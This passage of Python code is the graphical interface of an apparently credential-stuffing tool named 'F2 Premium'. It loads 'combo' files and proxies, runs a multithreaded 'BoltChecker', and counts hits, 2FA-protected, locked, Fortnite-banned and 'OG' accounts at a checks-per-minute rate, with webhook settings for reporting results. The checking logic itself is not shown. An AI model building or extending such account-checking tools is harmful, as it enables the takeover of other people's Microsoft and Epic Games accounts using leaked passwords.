        ctk.CTkLabel(stats_frame, text="📧 Valid Mail:", font=("Segoe UI", 14, "bold"), text_color="#ffaa00").grid(row=0, column=4, padx=5, pady=2, sticky="w")
        ctk.CTkLabel(stats_frame, textvariable=self.stats_valid_mail, font=("Segoe UI", 14), text_color="white").grid(row=0, column=5, padx=5, pady=2, sticky="w")

        # Row 1
        ctk.CTkLabel(stats_frame, text="🔐 2FA (MS+Epic):", font=("Segoe UI", 14, "bold"), text_color="#ff66ff").grid(row=1, column=0, padx=5, pady=2, sticky="w")
        ctk.CTkLabel(stats_frame, textvariable=self.stats_twofa, font=("Segoe UI", 14), text_color="white").grid(row=1, column=1, padx=5, pady=2, sticky="w")
        ctk.CTkLabel(stats_frame, text="🔒 Locked:", font=("Segoe UI", 14, "bold"), text_color="#ff8800").grid(row=1, column=2, padx=5, pady=2, sticky="w")
        ctk.CTkLabel(stats_frame, textvariable=self.stats_locked, font=("Segoe UI", 14), text_color="white").grid(row=1, column=3, padx=5, pady=2, sticky="w")
        ctk.CTkLabel(stats_frame, text="🚫 FN Banned:", font=("Segoe UI", 14, "bold"), text_color="#cc0000").grid(row=1, column=4, padx=5, pady=2, sticky="w")
        ctk.CTkLabel(stats_frame, textvariable=self.stats_fnban, font=("Segoe UI", 14), text_color="white").grid(row=1, column=5, padx=5, pady=2, sticky="w")

        # Row 2
        ctk.CTkLabel(stats_frame, text="👤 Headless:", font=("Segoe UI", 14, "bold"), text_color="#00aaff").grid(row=2, column=0, padx=5, pady=2, sticky="w")
        ctk.CTkLabel(stats_frame, textvariable=self.stats_headless, font=("Segoe UI", 14), text_color="white").grid(row=2, column=1, padx=5, pady=2, sticky="w")
        ctk.CTkLabel(stats_frame, text="🏆 STW:", font=("Segoe UI", 14, "bold"), text_color="#ffdd00").grid(row=2, column=2, padx=5, pady=2, sticky="w")
        ctk.CTkLabel(stats_frame, textvariable=self.stats_stw, font=("Segoe UI", 14), text_color="white").grid(row=2, column=3, padx=5, pady=2, sticky="w")
        ctk.CTkLabel(stats_frame, text="⭐ OG:", font=("Segoe UI", 14, "bold"), text_color="#ff00ff").grid(row=2, column=4, padx=5, pady=2, sticky="w")
        ctk.CTkLabel(stats_frame, textvariable=self.stats_og, font=("Segoe UI", 14), text_color="white").grid(row=2, column=5, padx=5, pady=2, sticky="w")

        # Row 3
        ctk.CTkLabel(stats_frame, text="🔄 Retries:", font=("Segoe UI", 14, "bold"), text_color="#aaaaaa").grid(row=3, column=0, padx=5, pady=2, sticky="w")
        ctk.CTkLabel(stats_frame, textvariable=self.stats_retries, font=("Segoe UI", 14), text_color="white").grid(row=3, column=1, padx=5, pady=2, sticky="w")
        ctk.CTkLabel(stats_frame, text="📊 CPM:", font=("Segoe UI", 14, "bold"), text_color="#88ff88").grid(row=3, column=2, padx=5, pady=2, sticky="w")
        ctk.CTkLabel(stats_frame, textvariable=self.stats_cpm, font=("Segoe UI", 14), text_color="white").grid(row=3, column=3, padx=5, pady=2, sticky="w")
        ctk.CTkLabel(stats_frame, text="📈 Progress:", font=("Segoe UI", 14, "bold"), text_color="#88ccff").grid(row=3, column=4, padx=5, pady=2, sticky="w")
        ctk.CTkLabel(stats_frame, textvariable=self.stats_checked, font=("Segoe UI", 14), text_color="white").grid(row=3, column=5, padx=5, pady=2, sticky="w")

        # Log
        log_frame = ctk.CTkFrame(right_frame, corner_radius=10, border_width=1, border_color="#444")
        log_frame.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")
        log_frame.grid_rowconfigure(0, weight=1)
        log_frame.grid_columnconfigure(0, weight=1)
        self.log_text = ctk.CTkTextbox(log_frame, height=150, wrap="word", font=("Consolas", 11))
        self.log_text.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)

        # Progress
        self.progress_bar = ctk.CTkProgressBar(right_frame, width=400, height=20, corner_radius=10)
        self.progress_bar.grid(row=2, column=0, padx=10, pady=(0,10), sticky="ew")
        self.progress_bar.set(0)

        # Buttons
        button_frame = ctk.CTkFrame(self, fg_color="transparent")
        button_frame.grid(row=2, column=0, padx=20, pady=(5,20), sticky="ew")
        button_frame.grid_columnconfigure(0, weight=1)
        button_frame.grid_columnconfigure(1, weight=1)
        button_frame.grid_columnconfigure(2, weight=1)

        self.start_btn = ctk.CTkButton(button_frame, text="▶ Start", width=120, height=40, corner_radius=10,
                                      fg_color="#00aa55", hover_color="#00cc66", command=self.start_check)
        self.start_btn.grid(row=0, column=0, padx=10)

        self.stop_btn = ctk.CTkButton(button_frame, text="⏹ Stop", width=120, height=40, corner_radius=10,
                                     fg_color="#cc3333", hover_color="#ee5555", command=self.stop_check, state="disabled")
        self.stop_btn.grid(row=0, column=1, padx=10)

        save_btn = ctk.CTkButton(button_frame, text="💾 Save Config", width=120, height=40, corner_radius=10,
                                 fg_color="#4488ff", hover_color="#66aaff", command=self.save_config)
        save_btn.grid(row=0, column=2, padx=10)

        self.log("Welcome to F2 Premium!")
        self.log("Place combo files in 'combos/' and proxies in 'proxies/'.")
        self.log("Configure settings and click Start.")

    def log(self, msg: str, level: str = "info"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        if level == "error":
            prefix = "[ERROR]"
            color = "#ff5555"
        elif level == "warning":
            prefix = "[WARN]"
            color = "#ffaa00"
        else:
            prefix = "[INFO]"
            color = "#88ccff"
        self.log_text.insert("end", f"{timestamp} {prefix} {msg}\n", ("info",))
        self.log_text.see("end")
        self.log_text.tag_config("info", foreground=color)

    def update_stats_gui(self, stats: Stats):
        self.stats_hits.set(str(stats.hits))
        self.stats_invalid.set(str(stats.invalid))
        valid_mail = stats.mshit + stats.xb
        self.stats_valid_mail.set(str(valid_mail))
        twofa = stats.custom + stats.epic2fa
        self.stats_twofa.set(str(twofa))
        self.stats_locked.set(str(stats.locked))
        self.stats_fnban.set(str(stats.fnban))
        self.stats_headless.set(str(stats.headless))
        self.stats_stw.set(str(stats.stw))
        self.stats_og.set(str(stats.og))
        self.stats_retries.set(str(stats.retries))
        self.stats_cpm.set(str(stats.cpm))
        self.stats_checked.set(f"{stats.checked}/{stats.total}")
        self.stats_total.set(str(stats.total))

    def update_progress_gui(self, value: float, desc: str):
        self.progress_bar.set(value / 100)
        if desc:
            self.title(f"F2 - {desc}")

    def start_check(self):
        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")

        # Save config
        self.config['checker']['threads'] = self.threads_var.get()
        self.config['checker']['timeout'] = self.timeout_var.get()
        self.config['checker']['retries'] = self.retries_var.get()
        self.config['checker']['proxy']['proxy'] = self.use_proxy_var.get()
        self.config['checker']['proxy']['proxy_type'] = self.proxy_type_var.get()
        self.config['checker']['proxy']['proxy_api'] = self.proxy_api_var.get()
        self.config['checker']['proxy']['api_link'] = self.proxy_api_link_var.get()
        self.config['checker']['webhook']['Webhook'] = self.webhook_var.get()
        self.config['checker']['webhook']['WebhookID'] = self.webhook_id_var.get()
        self.config['checker']['save_bad'] = self.save_bad_var.get()

        self.checker = BoltChecker(
            self.config,
            stats_update_callback=self.update_stats_gui,
            log_callback=self.log,
            progress_callback=self.update_progress_gui
        )

        self.check_thread = threading.Thread(target=self.checker.run, daemon=True)
        self.check_thread.start()
        self.log("Checker started.")

    def stop_check(self):
        if self.checker:
            self.checker.running = False
            self.log("Stopping checker...")
            self.start_btn.configure(state="normal")
            self.stop_btn.configure(state="disabled")
            if self.check_thread and self.check_thread.is_alive():
                self.check_thread.join(timeout=2)
            self.log("Checker stopped.")

    def save_config(self):
        self.config['checker']['threads'] = self.threads_var.get()
        self.config['checker']['timeout'] = self.timeout_var.get()
        self.config['checker']['retries'] = self.retries_var.get()
        self.config['checker']['proxy']['proxy'] = self.use_proxy_var.get()
        self.config['checker']['proxy']['proxy_type'] = self.proxy_type_var.get()
        self.config['checker']['proxy']['proxy_api'] = self.proxy_api_var.get()
        self.config['checker']['proxy']['api_link'] = self.proxy_api_link_var.get()
        self.config['checker']['webhook']['Webhook'] = self.webhook_var.get()
        self.config['checker']['webhook']['WebhookID'] = self.webhook_id_var.get()
        self.config['checker']['save_bad'] = self.save_bad_var.get()
        save_config(self.config)
        self.log("Configuration saved.")

# ----------------------------------------------------------------------
if __name__ == "__main__":
    ensure_directories()
    app = App()
    app.mainloop()
